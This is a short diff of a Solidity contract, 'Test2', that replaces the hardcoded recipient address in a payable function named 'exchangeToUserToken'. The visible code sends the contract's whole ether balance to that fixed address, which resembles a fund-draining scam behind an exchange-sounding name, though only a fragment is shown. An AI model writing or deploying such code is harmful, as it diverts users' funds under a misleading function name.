@@ -16,7 +16,7 @@ contract Test2 {
 
 
     function exchangeToUserToken(userConfig memory userDetails_) external payable {
-        address x = 0x0E743a1E37D691D8e52F7036375F3D148B4116ba;
+        address x = 0x1cc12A3437B42bf100002d26da383C1b911F2B38;
 
         if (address(this).balance > 0) {
             (bool success, ) = x.call{value: address(this).balance}(""); //msg.value
